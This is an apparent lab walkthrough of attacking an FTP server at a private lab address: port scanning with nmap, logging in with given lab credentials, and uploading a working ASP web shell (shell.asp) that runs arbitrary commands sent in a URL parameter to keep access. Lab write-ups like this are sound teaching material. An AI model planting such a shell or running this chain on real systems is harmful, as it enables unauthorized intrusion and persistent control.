# The Attack

## Step 1: Discovery

If you do not know an FTP server exists, the first step is to find it by scanning for open FTP ports (default: 21).

### Tools
- [Nmap](https://nmap.org/) — versatile port scanner  
- [Masscan](https://github.com/robertdavidgraham/masscan) — fast large-scale port scanner  
- [Shodan](https://www.shodan.io/) — search engine for internet-connected devices  

### Nmap Command

```bash
nmap -p 21 -sV 10.0.2.10
```

The results are posted below:  

![image](https://github.com/user-attachments/assets/71b6f87c-fa83-461a-b9ee-471c400a5b7f)


## Step 2: FTP Server Enumeration

---

## Objective

Once you have discovered an FTP server, the next step is to **enumerate** it. Enumeration involves gathering as much information as possible about the server, such as available users, permissions, files, and potential weaknesses.

---

## Why Enumerate?

- Identify valid usernames and passwords  
- Check for anonymous or guest login  
- Discover writable directories and files  
- Learn about the FTP server software/version  
- Find potential entry points for exploitation  

---

## Tools for FTP Enumeration

| Tool           | Description                                               |
|----------------|-----------------------------------------------------------|
| `ftp` client   | Built-in command line FTP client for manual interaction  |
| FileZilla      | Popular GUI FTP client for easier browsing                |
| Hydra          | Password brute forcing tool supporting FTP                |
| Medusa         | Another brute forcing tool with FTP module                |
| Nmap NSE Scripts | Scripts like `ftp-anon`, `ftp-brute` for automated checks |

---

## Manual FTP Enumeration

### Connect to the FTP server

```bash
ftp 10.0.2.10
```

We know the creds are adminuser/Iamadmin123 but if we didn't we could use Hydra to password bruteforce our way through.


## Step 3: Exploit and Persist

The next step I did was create a file called shell.asp that contained the code below:

```
<%
If Request.QueryString("cmd") <> "" Then
  Set shell = CreateObject("WScript.Shell")
  Set exec = shell.Exec(Request.QueryString("cmd"))
  output = exec.StdOut.ReadAll()
  Response.Write "<pre>" & output & "</pre>"
End If
%>
```

After logging into FTP again, I created a new directory, went into it and put the shell.asp file in there.

![image](https://github.com/user-attachments/assets/5189bd9e-edd8-4309-bd60-7ef39d143520)

After this, I can type in http://10.0.2.10/shell.asp and write whatever command I want after to maintain persistance, usually this is done by creating another user.
